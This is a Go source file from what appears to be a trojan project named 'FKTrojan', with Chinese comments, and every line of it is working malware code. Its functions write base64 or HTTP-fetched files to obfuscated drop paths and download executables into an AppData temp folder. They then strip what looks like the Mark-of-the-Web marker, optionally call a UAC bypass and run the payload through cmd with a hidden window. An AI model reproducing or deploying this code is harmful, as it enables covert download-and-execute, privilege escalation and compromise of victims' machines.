/*
Author: FreeKnight
文件上传/下载
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"encoding/base64"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

//------------------------------------------------------------
// 向上推送文件并存放到到指定位置
func filePush(mod, file, name, drop string) (string, error) {
	if mod == "0" { // 文件在参数中，以base64格式发过来了
		mkFile, err := os.Create(common.Deobfuscate(drop) + common.Deobfuscate(name))
		if err != nil {
			return "", err
		}
		decodeFile, err1 := base64.StdEncoding.DecodeString(file)
		if err1 != nil {
			return "", err1
		}
		_, err1 = mkFile.WriteString(string(decodeFile))
		if err1 != nil {
			return "", err1
		}
		err1 = mkFile.Close()
		if err1 != nil {
			return "", err1
		}
		return "Save file successed.", nil
	}
	// 文件是http请求格式，请求后进行保存
	output, err := os.Create(common.Deobfuscate(drop) + common.Deobfuscate(name))
	if err != nil {
		return "", err
	}
	defer output.Close()
	response, err1 := http.Get(file)
	if err1 != nil {
		return "", err1
	}
	defer response.Body.Close()
	_, err = io.Copy(output, response.Body)
	if err != nil {
		return "", err1
	}
	return "Save file from http successed.", nil
}

//------------------------------------------------------------
// 下载并执行文件
func downloadAndRun(mod string, file string, MD5 string, uac string, Parameters string) (string, error) {
	if mod == "0" {
		n := randomString(5, false)
		Binary, err1 := os.Create(tmpAppDataInstallDir + n + ".exe")
		if err1 != nil {
			return "", err1
		}
		defer Binary.Close()
		DecodedBinary, err2 := base64.StdEncoding.DecodeString(file)
		if err2 != nil {
			return "", err2
		}
		_, err3 := Binary.WriteString(string(DecodedBinary))
		if err3 != nil {
			return "", err3
		}
		err4 := Binary.Close()
		if err4 != nil {
			return "", err4
		}

		if MD5 != "false" {
			if string(common.Md5HashFile(tmpAppDataInstallDir+n+".exe")) != MD5 {
				return "", errors.New("Download and Run File Currupted")
			}
		}

		if uac != "0" {
			successed := uacBypass(tmpAppDataInstallDir + n + ".exe" + " " + Parameters)
			if !successed {
				return "", errors.New("Download and Run File Currupted")
			}
		}

		Command := string(tmpAppDataInstallDir + n + ".exe" + " " + Parameters)
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err5 := Exec.Start()
		if err5 != nil {
			return "", err5
		}

		return "Download and Run File successed", nil
	} else if mod == "1" { // 网络请求后，下载保存并执行
		if !(strings.Contains(file, "http://")) {
			return "", errors.New("Type 1 must use 'Http://' url head.")
		}

		n := randomString(5, false)
		output, err1 := os.Create(tmpAppDataInstallDir + n + ".exe")
		if err1 != nil {
			return "", err1
		}
		defer output.Close()
		response, err2 := http.Get(file)
		if err2 != nil {
			return "", err2
		}
		defer response.Body.Close()
		_, err3 := io.Copy(output, response.Body)
		if err3 != nil {
			return "", err3
		}

		err4 := os.Remove(tmpAppDataInstallDir + n + common.Deobfuscate("/fyf;[pof/Jefoujgjfs"))
		if err4 != nil {
			return "", err4
		}

		if MD5 != "false" {
			if string(common.Md5HashFile(tmpAppDataInstallDir+n+".exe")) != MD5 {
				return "", errors.New("Download and Run File Currupted")
			}
		}

		if uac != "0" {
			successed := uacBypass(tmpAppDataInstallDir + n + ".exe")
			if !successed {
				return "", errors.New("Download and Run File Currupted")
			}
		}

		Command := string(tmpAppDataInstallDir + n + ".exe" + " " + Parameters)
		Exec := exec.Command("cmd", "/C", Command)
		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err5 := Exec.Start()
		if err5 != nil {
			return "", err5
		}

		return "Download and Run File successed", nil
	}

	return "", errors.New("Unknown type.")
}

//------------------------------------------------------------
